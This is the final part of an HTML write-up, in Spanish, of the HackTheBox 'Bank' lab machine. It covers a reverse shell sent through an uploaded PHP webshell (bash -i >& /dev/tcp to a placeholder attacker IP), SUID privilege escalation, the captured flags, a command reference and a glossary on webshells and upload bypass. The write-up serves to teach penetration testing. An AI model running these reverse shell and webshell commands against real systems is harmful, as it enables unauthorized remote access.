+          establece la conexión hacia nuestro listener.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="http://bank.htb/uploads/shell.htb?cmd=bash -c 'bash -i >& /dev/tcp/TU_IP/443 0>&1'">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">REVERSE SHELL · URL</span>
+        <div><span class="comment"># URL en el navegador (con encoding):</span></div>
+        <div><span class="arg">http://bank.htb/uploads/shell.htb?cmd=bash -c "bash -i %3E%26 /dev/tcp/<span class="o-red">TU_IP</span>/443 0%3E%261"</span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">connect to [10.10.16.5] from (UNKNOWN) [10.129.3.73] 57214</span></div>
+        <div>bash: cannot set terminal process group (1082): Inappropriate ioctl for device</div>
+        <div>bash: no job control in this shell</div>
+        <div><span class="o-green">www-data@bank:/var/www/bank/uploads$</span> <span class="o-yellow">▌</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">17</div>
+        <span class="step-title">ENUMERAR EL SISTEMA — USUARIO chris</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con la shell como <code style="color:var(--yellow);font-family:var(--font-mono)">www-data</code>
+          comenzamos a explorar el sistema. Navegamos al directorio home para identificar
+          usuarios existentes, luego leemos el flag de usuario:
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="cd home && ls && cd chris && ls && cat user.txt">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">ENUM SISTEMA</span>
+        <div><span class="prompt">www-data@bank:/$ </span><span class="cmd">cd home && ls</span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-cyan">chris</span></div>
+        <div>&nbsp;</div>
+        <div><span class="prompt">www-data@bank:/home$ </span>cd chris &amp;&amp; ls</div>
+        <div><span class="o-yellow">user.txt</span></div>
+        <div>&nbsp;</div>
+        <div><span class="prompt">www-data@bank:/home/chris$ </span>cat user.txt</div>
+        <div><span class="o-green">6be0e40ae7bbd0d66f245e0a3ecff470</span></div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 09 PRIVESC ===================== -->
+    <div class="section" id="privesc">
+      <p class="section-label">// 09</p>
+      <h2 class="section-title">Escalada de Privilegios · SUID emergency</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">18</div>
+        <span class="step-title">BUSCAR BINARIOS CON SUID</span>
+      </div>
+      <div class="prose">
+        <p>
+          La escalada de privilegios con <strong>SUID</strong> es una técnica clásica en Linux.
+          Un binario con el bit SUID activado se ejecuta con los <strong>privilegios del
+          propietario del archivo</strong> (normalmente root), sin importar qué usuario lo
+          ejecute. Buscamos todos los archivos SUID en el sistema con
+          <span class="hl-cyan">find</span>:
+        </p>
+        <p>
+          <span class="hl-cyan">find /</span> inicia la búsqueda desde la raíz del sistema
+          de archivos, recorriendo todos los directorios.
+          <span class="hl-cyan">-perm -4000</span> filtra archivos que tengan el bit SUID
+          activado (el "4" en octal representa el bit SUID; el guión "-" significa "al menos
+          estos bits"). <span class="hl-cyan">-type f</span> limita la búsqueda solo a
+          <strong>archivos regulares</strong> (excluye directorios, symlinks, etc.).
+          <span class="hl-cyan">2&gt;/dev/null</span> redirige los <strong>errores</strong>
+          (como "Permission denied") al vacío, para no ensuciar la salida con mensajes que
+          no podemos resolver como www-data.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="find / -perm -4000 -type f 2>/dev/null">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">BUSCAR SUID</span>
+        <div><span class="prompt">www-data@bank:/$ </span><span class="cmd">find <span class="arg">/</span> <span class="flag">-perm -4000</span> <span class="flag">-type f</span> <span class="arg">2&gt;/dev/null</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>/var/htb/bin/emergency</div>
+        <div>/usr/lib/eject/dmcrypt-get-device</div>
+        <div>/usr/lib/openssh/ssh-keysign</div>
+        <div>/usr/lib/dbus-1.0/dbus-daemon-launch-helper</div>
+        <div>/usr/lib/policykit-1/polkit-agent-helper-1</div>
+        <div>/usr/bin/at</div>
+        <div>/usr/bin/chsh</div>
+        <div>/usr/bin/passwd</div>
+        <div>/usr/bin/chfn</div>
+        <div>/usr/bin/pkexec</div>
+        <div>/usr/bin/newgrp</div>
+        <div>/usr/bin/gpasswd</div>
+        <div>/usr/bin/sudo</div>
+        <div>/bin/ping</div>
+        <div>/bin/su</div>
+        <div>/bin/fusermount</div>
+        <div>/bin/mount</div>
+        <div>/bin/umount</div>
+        <div><span class="o-green">★ /var/htb/bin/emergency</span>&nbsp;&nbsp;<span class="o-yellow">&lt;--- binario custom con SUID</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">19</div>
+        <span class="step-title">VERIFICAR EL BINARIO EMERGENCY</span>
+      </div>
+      <div class="prose">
+        <p>
+          Inspeccionamos los permisos del binario con
+          <span class="hl-cyan">ls -l</span> para confirmar que tiene SUID y que pertenece
+          a root. La "s" en la posición del bit de ejecución del propietario
+          (<code style="color:var(--yellow);font-family:var(--font-mono)">rws</code>)
+          confirma el SUID. Al ejecutarlo, el proceso hereda los privilegios de
+          <strong>root</strong> sin importar que lo estemos lanzando como www-data.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="ls -l /var/htb/bin/emergency">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">VERIFICAR PERMISOS</span>
+        <div><span class="prompt">www-data@bank:/$ </span><span class="cmd">ls <span class="flag">-l</span> <span class="arg">//var/htb/bin/emergency</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-red">-rwsr-xr-x</span> 1 <span class="o-green">root root</span> 112204 Jun 14  2017 <span class="o-yellow">//var/htb/bin/emergency</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">20</div>
+        <span class="step-title">EJECUTAR EMERGENCY → ROOT</span>
+      </div>
+      <div class="prose">
+        <p>
+          Ejecutamos el binario directamente. Por el bit SUID activado con propietario root,
+          el proceso corre como root y nos entrega una shell privilegiada.
+          Confirmamos con <span class="hl-cyan">whoami</span>:
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="/var/htb/bin/emergency">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PRIVESC · SUID</span>
+        <div><span class="prompt">www-data@bank:/$ </span><span class="cmd"><span class="arg">/var/htb/bin/emergency</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>/var/htb/bin/emergency</div>
+        <div><span class="prompt-root">whoami</span></div>
+        <div><span class="o-red">root</span></div>
+      </div>
+
+      <div class="vuln-box">
+        <p class="vuln-box-title">// VULNERABILIDAD — SUID EN BINARIO CUSTOM</p>
+        <p>
+          El binario <code>/var/htb/bin/emergency</code> tiene el bit SUID activado y es
+          propiedad de root. A diferencia de binarios del sistema con SUID justificado
+          (como <code>ping</code> o <code>su</code>), este es un binario <strong>custom y
+          no documentado</strong>. Cualquier usuario del sistema puede ejecutarlo y obtener
+          una shell de root. La práctica correcta es evitar SUID en binarios custom, usar
+          sudo con reglas granulares en su lugar, y auditar periódicamente todos los binarios
+          SUID del sistema.
+        </p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 10 FLAGS ===================== -->
+    <div class="section" id="flags">
+      <p class="section-label">// 10</p>
+      <h2 class="section-title">Flags</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">21</div>
+        <span class="step-title">USER FLAG</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="cat /home/chris/user.txt">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">USER FLAG</span>
+        <div><span class="prompt">www-data@bank:/home/chris$ </span><span class="cmd">cat <span class="arg">/home/chris/user.txt</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">6be0e40ae7bbd0d66f245e0a3ecff470</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">22</div>
+        <span class="step-title">ROOT FLAG</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="cat /root/root.txt">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">ROOT FLAG</span>
+        <div><span class="prompt-root">root@bank:/# </span><span class="cmd">cat <span class="arg">/root/root.txt</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-red">dc7357216742fe3bbca0b156eb55bdd4</span></div>
+      </div>
+
+      <div class="cred-box">
+        <div class="cred-item">
+          <div class="cred-label">USER FLAG</div>
+          <div class="cred-val">6be0e40ae7bbd0d66f245e0a3ecff470</div>
+        </div>
+        <div class="cred-item">
+          <div class="cred-label">ROOT FLAG</div>
+          <div class="cred-val" style="color:var(--red)">dc7357216742fe3bbca0b156eb55bdd4</div>
+        </div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 11 REFERENCIA ===================== -->
+    <div class="section" id="referencia">
+      <p class="section-label">// 11</p>
+      <h2 class="section-title">Referencia de Comandos</h2>
+      <div class="section-line"></div>
+
+      <div class="cmd-ref-grid">
+
+        <div class="cmd-ref-card">
+          <p class="cmd-ref-name">nmap</p>
+          <code class="cmd-ref-syntax">nmap [flags] &lt;objetivo&gt;</code>
+          <p class="cmd-ref-desc">Scanner de puertos y servicios. Detecta versiones, ejecuta scripts NSE y enumera la superficie de ataque.</p>
+          <ul class="cmd-ref-flags">
+            <li><span>-p-</span> — escanear todos los 65535 puertos</li>
+            <li><span>-sV</span> — detección de versiones de servicios</li>
+            <li><span>-sC</span> — scripts NSE por defecto</li>
+            <li><span>-sS</span> — SYN scan sigiloso (half-open)</li>
+            <li><span>-n</span> — no resolución DNS inversa</li>
+            <li><span>-Pn</span> — sin host discovery (trata host como activo)</li>
+            <li><span>--min-rate=5000</span> — mínimo 5000 paquetes/segundo</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <p class="cmd-ref-name">wfuzz</p>
+          <code class="cmd-ref-syntax">wfuzz [flags] -w &lt;wordlist&gt; &lt;URL/FUZZ&gt;</code>
+          <p class="cmd-ref-desc">Fuzzer web que sustituye FUZZ en la URL por cada palabra del diccionario. Ideal para enumerar directorios, archivos y parámetros.</p>
+          <ul class="cmd-ref-flags">
+            <li><span>-c</span> — salida con colores</li>
+            <li><span>-hc=302</span> — ocultar respuestas con código 302</li>
+            <li><span>-hc=404</span> — ocultar respuestas "Not Found"</li>
+            <li><span>-t 200</span> — 200 hilos concurrentes</li>
+            <li><span>-w</span> — especificar wordlist</li>
+            <li><span>FUZZ</span> — marcador de posición de inyección</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <p class="cmd-ref-name">curl</p>
+          <code class="cmd-ref-syntax">curl [flags] &lt;URL&gt;</code>
+          <p class="cmd-ref-desc">Herramienta para transferir datos desde/hacia URLs. Permite hacer peticiones HTTP personalizadas, descargar contenido y analizar respuestas.</p>
+          <ul class="cmd-ref-flags">
+            <li><span>(sin flags)</span> — petición GET y mostrar respuesta</li>
+            <li><span>-s</span> — modo silencioso (sin barra de progreso)</li>
+            <li><span>-L</span> — seguir redirecciones</li>
+            <li><span>-o archivo</span> — guardar salida en archivo</li>
+            <li><span>| awk | grep</span> — pipeline para filtrar salida</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <p class="cmd-ref-name">find</p>
+          <code class="cmd-ref-syntax">find &lt;ruta&gt; [criterios]</code>
+          <p class="cmd-ref-desc">Busca archivos y directorios en el sistema según criterios como permisos, tipo, nombre o propietario. Esencial para post-explotación.</p>
+          <ul class="cmd-ref-flags">
+            <li><span>/</span> — buscar desde la raíz del sistema</li>
+            <li><span>-perm -4000</span> — archivos con bit SUID</li>
+            <li><span>-type f</span> — solo archivos regulares</li>
+            <li><span>-type d</span> — solo directorios</li>
+            <li><span>2&gt;/dev/null</span> — suprimir errores de permiso</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <p class="cmd-ref-name">nc (netcat)</p>
+          <code class="cmd-ref-syntax">nc [flags] [host] [puerto]</code>
+          <p class="cmd-ref-desc">La "navaja suiza" de redes. Permite crear conexiones TCP/UDP, actuar como servidor o cliente, y es la herramienta estándar para recibir reverse shells.</p>
+          <ul class="cmd-ref-flags">
+            <li><span>-l</span> — modo escucha (listen)</li>
+            <li><span>-v</span> — verbose, mostrar eventos</li>
+            <li><span>-n</span> — sin resolución DNS</li>
+            <li><span>-p 443</span> — puerto de escucha (443 evade firewalls)</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <p class="cmd-ref-name">ping</p>
+          <code class="cmd-ref-syntax">ping [flags] &lt;host&gt;</code>
+          <p class="cmd-ref-desc">Envía paquetes ICMP Echo Request para verificar conectividad. Útil para confirmar que un host está activo y que el DNS resuelve correctamente.</p>
+          <ul class="cmd-ref-flags">
+            <li><span>-c N</span> — enviar exactamente N paquetes</li>
+            <li><span>-i</span> — intervalo entre paquetes (segundos)</li>
+            <li><span>-t TTL</span> — valor TTL de los paquetes</li>
+            <li><span>bank.htb</span> — verifica resolución DNS local</li>
+          </ul>
+        </div>
+
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 12 GLOSARIO ===================== -->
+    <div class="section" id="glosario">
+      <p class="section-label">// 12</p>
+      <h2 class="section-title">Glosario</h2>
+      <div class="section-line"></div>
+
+      <div class="glosario-grid">
+
+        <div class="glos-card">
+          <div class="glos-term">Virtual Hosting y /etc/hosts</div>
+          <div class="glos-def">
+            El <strong>virtual hosting</strong> es una técnica que permite a un servidor web alojar múltiples sitios en la misma IP, diferenciados por el header HTTP <code>Host:</code>. Cuando el navegador hace una petición, incluye el dominio en ese header y Apache decide qué configuración usar. El archivo <code>/etc/hosts</code> es un <strong>resolver DNS local</strong> del sistema operativo: se consulta antes que cualquier servidor DNS externo. Al añadir <code>10.129.3.73 bank.htb</code>, le decimos al SO que traduzca ese dominio a esa IP sin necesitar DNS público. Esto permite acceder a máquinas de laboratorio con dominios <code>.htb</code> que no existen en internet.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Directory Listing — Exposición de Directorios</div>
+          <div class="glos-def">
+            El <strong>directory listing</strong> (listado de directorios) es una función de los servidores web que muestra el contenido de un directorio cuando no existe un archivo índice (<code>index.html</code>, <code>index.php</code>) y la configuración del servidor lo permite. Esto expone todos los archivos del directorio a cualquier visitante. En Apache, se controla con la directiva <code>Options -Indexes</code>. En este caso, <code>/balance-transfer/</code> tenía el listing habilitado, exponiendo cientos de archivos de cuentas bancarias. El atacante pudo ver e iterar sobre todos sin autenticación.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">wfuzz — Web Fuzzer</div>
+          <div class="glos-def">
+            <strong>wfuzz</strong> es una herramienta de fuzzing web escrita en Python. El principio es simple: toma una URL con el marcador <code>FUZZ</code> y lo sustituye por cada línea de un diccionario, analizando las respuestas HTTP. Es muy flexible: puede fuzzear rutas, parámetros GET/POST, headers, cookies, etc. Con las flags <code>-hc</code> (hide code) y <code>-hl</code> (hide lines) se filtran las respuestas no interesantes para encontrar contenido "diferente" que revele recursos ocultos. Los diccionarios como SecLists o DirBuster contienen miles de rutas comunes de aplicaciones web.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Credenciales en Texto Plano — Clear Text Credentials</div>
+          <div class="glos-def">
+            Almacenar contraseñas en <strong>texto plano</strong> (sin cifrar ni hashear) en archivos accesibles es una práctica gravemente insegura. En este caso, el proceso de cifrado falló y dejó el archivo <code>.acc</code> con la contraseña directamente legible. La práctica correcta incluye: usar <strong>hashes modernos</strong> (bcrypt, Argon2, scrypt) para contraseñas, implementar cifrado simétrico con llaves almacenadas de forma segura, y nunca exponer archivos de datos sensibles en directorios públicos del webroot. Una capa adicional de defensa hubiera sido requerir autenticación para acceder a <code>/balance-transfer/</code>.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">File Upload Bypass — Evasión de Filtros de Subida</div>
+          <div class="glos-def">
+            Las <strong>vulnerabilidades de subida de archivos</strong> ocurren cuando un servidor permite subir archivos sin validar correctamente su tipo. Los filtros pueden estar en el <strong>cliente</strong> (JavaScript, fácilmente evadible con Burp) o en el <strong>servidor</strong> (validación de MIME type, extensión, magic bytes). En este caso, el servidor filtraba extensiones comunes (<code>.php</code>) pero tenía una backdoor de debugging: la extensión <code>.htb</code> configurada para ejecutarse como PHP. Burp Suite permite interceptar y modificar cualquier petición antes de que llegue al servidor, incluyendo el nombre del archivo y su Content-Type.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Webshell PHP — Remote Code Execution (RCE)</div>
+          <div class="glos-def">
+            Una <strong>webshell</strong> es un script malicioso que, al ser ejecutado por el servidor web, permite al atacante ejecutar comandos del sistema operativo a través de peticiones HTTP. La webshell PHP más básica usa <code>shell_exec($_REQUEST['cmd'])</code>: <code>shell_exec()</code> ejecuta un comando en el shell del sistema y retorna toda la salida como string; <code>$_REQUEST['cmd']</code> captura el parámetro <code>cmd</code> de la URL. El resultado es que cualquier comando enviado via URL (<code>?cmd=whoami</code>, <code>?cmd=id</code>, etc.) se ejecuta en el servidor con los privilegios del proceso web (normalmente <code>www-data</code>).
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Reverse Shell — bash -i &gt;&amp; /dev/tcp</div>
+          <div class="glos-def">
+            Una <strong>reverse shell</strong> es una técnica donde el servidor víctima inicia la conexión hacia el atacante (inverso a una bind shell). Esto elude firewalls que bloquean conexiones entrantes pero permiten las salientes. El mecanismo <code>/dev/tcp/IP/PUERTO</code> es una función especial de <strong>Bash</strong> que abre un socket TCP. Combinado con <code>bash -i</code> (bash interactivo) y la redirección <code>&gt;&amp; ... 0&gt;&amp;1</code> (redirigir stdout, stderr y stdin al socket), obtenemos una shell completa. El atacante escucha con <strong>netcat</strong> (<code>nc -lvnp PUERTO</code>) y recibe la conexión entrante del servidor comprometido.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">SUID — Set User ID on Execution</div>
+          <div class="glos-def">
+            El bit <strong>SUID (Set User ID)</strong> es un permiso especial de Unix/Linux. Cuando está activado en un ejecutable, el proceso corre con los privilegios del <strong>propietario del archivo</strong> en lugar del usuario que lo ejecuta. Si el propietario es <code>root</code> y el bit SUID está activo (<code>rwsr-xr-x</code>), cualquier usuario puede ejecutar ese binario como root. Esto es legítimo en binarios del sistema como <code>passwd</code> o <code>ping</code> (necesitan acceso a recursos privilegiados), pero peligroso en binarios custom o genéricos que permiten ejecutar código arbitrario. La enumeración de SUID es estándar en post-explotación para escalar privilegios.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Burp Suite — Proxy de Intercepción HTTP</div>
+          <div class="glos-def">
+            <strong>Burp Suite</strong> es la herramienta de pentesting web más usada. Actúa como un <strong>proxy HTTP(S)</strong> entre el navegador y el servidor: intercepta todas las peticiones y respuestas, permitiendo modificarlas antes de que lleguen a destino. El módulo <strong>Repeater</strong> (Ctrl+R) permite reenviar peticiones modificadas repetidamente para probar variaciones. El módulo <strong>Intercept</strong> pausa cada petición para editarla en tiempo real. En este reto, Burp fue clave para: (1) inspeccionar el código fuente de la respuesta del servidor que contenía el comentario DEBUG, y (2) modificar la extensión del archivo subido de <code>.php</code> a <code>.htb</code>.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">URL Encoding — Codificación de Caracteres en URLs</div>
+          <div class="glos-def">
+            El <strong>URL encoding</strong> (también llamado percent-encoding) es un mecanismo para representar caracteres especiales en URLs usando el formato <code>%XX</code> donde XX es el valor hexadecimal del carácter ASCII. Las URLs solo pueden contener un conjunto limitado de caracteres; los demás deben codificarse. En la reverse shell, los caracteres <code>&gt;&amp;</code> tienen significado especial en bash y en HTTP, por lo que los codificamos: <code>&gt;</code> se convierte en <code>%3E</code>, <code>&amp;</code> en <code>%26</code>. Esto permite enviarlos a través de la URL sin que el navegador o el servidor los interprete como separadores de parámetros.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">ISC BIND — DNS en Puerto 53</div>
+          <div class="glos-def">
+            <strong>ISC BIND</strong> (Berkeley Internet Name Domain) es el servidor DNS más usado en internet. El hecho de que la máquina Bank tenga <strong>puerto 53 abierto</strong> con BIND es una pista importante: indica que el servidor gestiona resolución de nombres localmente, lo que sugiere la existencia de un dominio virtual (<code>bank.htb</code>). Sin esta pista, podríamos no haber intentado editar <code>/etc/hosts</code>. En CTFs y pentesting real, un servidor DNS propio es señal de que debemos configurar nuestro resolver para apuntar a él o al menos añadir el dominio manualmente a nuestro <code>/etc/hosts</code>.
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+  </main>
+</div>
+
+<!-- FOOTER -->
+<footer>
+  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup personal · HackTheBox</p>
+  <p>Built with <span>kali linux</span> &amp; <span>❤</span></p>
+</footer>
+
+<script>
+  // ACTIVE TOC
+  const sections = document.querySelectorAll('.section[id]');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const tocObserver = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+  sections.forEach(s => tocObserver.observe(s));
+
+  // CURSOR
+  const cursor = document.getElementById('cursor');
+  const ring   = document.getElementById('cursorRing');
+  document.addEventListener('mousemove', e => {
+    cursor.style.left = e.clientX + 'px'; cursor.style.top = e.clientY + 'px';
+    ring.style.left   = e.clientX + 'px'; ring.style.top   = e.clientY + 'px';
+    cursor.style.opacity = '1'; ring.style.opacity = '0.5';
+  });
+  document.addEventListener('mousedown', () => { cursor.style.transform = 'translate(-50%,-50%) scale(0.5)'; });
+  document.addEventListener('mouseup',   () => { cursor.style.transform = 'translate(-50%,-50%)'; });
+  document.querySelectorAll('a, button').forEach(el => {
+    el.addEventListener('mouseenter', () => { ring.style.width = '54px'; ring.style.height = '54px'; ring.style.opacity = '0.3'; });
+    el.addEventListener('mouseleave', () => { ring.style.width = '36px'; ring.style.height = '36px'; ring.style.opacity = '0.5'; });
+  });
+
+  // SCROLL REVEAL
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.06 });
+  document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+  // PROGRESS BAR
+  window.addEventListener('scroll', () => {
+    const winScroll = document.documentElement.scrollTop;
+    const height = document.documentElement.scrollHeight - window.innerHeight;
+    const scrolled = height > 0 ? (winScroll / height) * 100 : 0;
+    const bar = document.getElementById('readingProgress');
+    if (bar) bar.style.width = scrolled + '%';
+  });
+
+  // TOAST
+  function showToast(msg) {
+    let toast = document.querySelector('.toast');
+    if (!toast) {
+      toast = document.createElement('div');
+      toast.className = 'toast';
+      document.body.appendChild(toast);
+    }
+    toast.textContent = '📋 ' + msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+  }
+
+  // COPY COMMAND
+  function copyCmd(btn) {
+    const block = btn.closest('.cmd-block');
+    const cmd = block.dataset.cmd || '';
+    navigator.clipboard.writeText(cmd).then(() => {
+      btn.textContent = '✓ OK';
+      btn.classList.add('copied');
+      showToast('Comando copiado ✓');
+      setTimeout(() => {
+        btn.textContent = 'COPY';
+        btn.classList.remove('copied');
+      }, 1800);
+    }).catch(() => {
+      showToast('Error al copiar');
+    });
+  }
+</script>
+</body>
+</html>
